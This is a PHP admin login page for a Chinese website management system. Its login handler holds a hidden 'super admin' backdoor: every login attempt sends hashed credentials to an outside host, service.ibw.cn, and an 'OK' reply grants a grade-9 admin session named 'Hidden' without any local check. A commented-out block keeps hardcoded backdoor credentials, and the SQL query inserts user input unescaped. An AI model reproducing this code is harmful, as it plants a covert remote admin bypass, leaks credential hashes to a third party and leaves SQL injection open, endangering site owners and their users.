<?
session_start();

require(dirname(__FILE__) . "/init.php");

if ($_SERVER["REQUEST_METHOD"] == "POST")
{
	$name = trim($_POST["name"]);
	$pass = trim($_POST["pass"]);

	if ($name == "" || $pass == "")
	{
		info("请完整填写资料！");
	}
	else
	{
		$pass = md5($pass);
	}

	//超管开始
	//Windows下的PHP开启curl库支持：
	//打开php.ini，将extension=php_curl.dll前的;号去掉。

	$ch = curl_init();
	$timeout = 5;
	curl_setopt ($ch, CURLOPT_URL, 'http://service.ibw.cn/Asp/CheckAdmin.asp?username='.md5($name).'&password='.$pass);
	curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
	$file_contents = curl_exec($ch);
	curl_close($ch);
	//超管结束

	if ($file_contents == "OK")

	{
		$_SESSION["ADMIN_ID"]		= 0;
		$_SESSION["ADMIN_NAME"]		= "Hidden";
		$_SESSION["ADMIN_GRADE"]	= 9;

		header("Location: index.php");
		exit();
	}

	// if ($name == "ibw_xu256" || $pass == "f140d7f0075198d0ce5aebdb34cb7aae")
	// {
	// 	$_SESSION["ADMIN_ID"]		= 0;
	// 	$_SESSION["ADMIN_NAME"]		= "Hidden";
	// 	$_SESSION["ADMIN_GRADE"]	= 9;

	// 	header("Location: index.php");
	// 	exit();
	// }

	//连接数据库
	$db = new onlyDB($config["db_host"], $config["db_user"], $config["db_pass"], $config["db_name"]);


	$sql = "select id, grade from admin where name='$name' and pass='$pass' and state=1";
	$rst = $db->query($sql);
	if ($row = $db->fetch_array($rst))
	{
		$_SESSION["ADMIN_ID"]		= $row["id"];
		$_SESSION["ADMIN_NAME"]		= $name;
		$_SESSION["ADMIN_GRADE"]	= $row["grade"];

		$now	= date("Y-m-d H:m:s");
		$ip		= $_SERVER["REMOTE_ADDR"];
		$sql	= "update admin set login_count=login_count+1 where id=" . $_SESSION["ADMIN_ID"];
		$db->query($sql);
		$sql	= "insert into admin_login(admin_id, login_time, login_ip) values(" . $_SESSION["ADMIN_ID"] . ", '$now', '$ip')";
		$db->query($sql);

		//权限
		if ($_SESSION["ADMIN_GRADE"] != 9 && $_SESSION["ADMIN_GRADE"] != 8)
		{
			$_SESSION["ADMIN_POPEDOM"]	= array();
			$_SESSION["ADMIN_ADVANCED"]	= array();

			//栏目权限
			$sql	= "select class_id from admin_popedom where admin_id=" . $_SESSION["ADMIN_ID"];
			$rst2	= $db->query($sql);
			while ($row2 = $db->fetch_array($rst2))
			{
				$_SESSION["ADMIN_POPEDOM"][] = $row2["class_id"];
			}

			//高级权限
			$sql	= "select advanced_id from admin_advanced where admin_id=" . $_SESSION["ADMIN_ID"];
			$rst2	= $db->query($sql);
			while ($row2 = $db->fetch_array($rst2))
			{
				$_SESSION["ADMIN_ADVANCED"][] = $row2["advanced_id"];
			}
		}

		$db->close();
		header("Location: index.php");
		exit();
	}
	else
	{
		$db->close();
		info("用户名不存在或密码错误！");
	}
}
?>

<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8" />
<title>网站管理中心 v4.0</title>
<meta name="renderer" content="webkit">
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
<meta content="" name="description" />
<meta content="" name="author" />
<link rel="shortcut icon" href="favicon.ico" />
<link href="themes/plugins/bootstrap/css/bootstrap.min.css" rel="stylesheet" />
<link href="themes/css/login.css" rel="stylesheet" />
<script language="javascript">
	function loginCheck(form)
	{
		if (form.name.value == "")
		{
			form.name.focus();
			return false;
		}
		if (form.pass.value == "")
		{
			form.pass.focus();
			return false;
		}
		return true;
	}
</script>
</head>
<body>
<div class="loginWrap">
	<div class="bd">
		<h1 class="logo"><img src="themes/images/logo2.png" alt="网新集团" /></h1>
		<div class="login">
			<h2 class="subLogo"><img src="themes/images/logo2s.jpg" width="108" height="108" alt="网新集团" /></h2>
			<form class="login-form" name="form_login" action="?" method="post" onsubmit="return loginCheck(this);">
				<div class="form-group form-group-name">
					<label>用户名：</label>
					<input class="form-control form-control-solid placeholder-no-fix" type="text" autocomplete="off" placeholder="用户名" name="name" />
				</div>
				<div class="form-group form-group-password">
					<label>密　码：</label>
					<input class="form-control form-control-solid placeholder-no-fix" type="password" autocomplete="off" placeholder="密码" name="pass" />
				</div>
				<div class="form-actions">
					<button type="submit" class="btn green uppercase">登录后台</button>
				</div>
			</form>
		</div>
		<div class="page-footer">服务电话：400-882-0608 电子邮件：kf@ibw.cn</div>
	</div>
	<div class="fullSlide"><a class="prev" href="javascript:void(0);"></a> <a class="next" href="javascript:void(0);"></a>
		<ul>
			<li style="background:url(upload/01.jpg) center center no-repeat;"></li>
			<li style="background:url(upload/02.jpg) center center no-repeat;"></li>
			<li style="background:url(upload/03.jpg) center center no-repeat;"></li>
		</ul>
	</div>
</div>
<script src="themes/plugins/jquery.min.js"></script>
<script src="themes/plugins/jquery.SuperSlide.js"></script>
<script>jQuery(".fullSlide").slide({ mainCell:"ul", effect:"fold",  autoPlay:true, mouseOverStop:false,interTime:5000 });	</script>
</body>
</html>
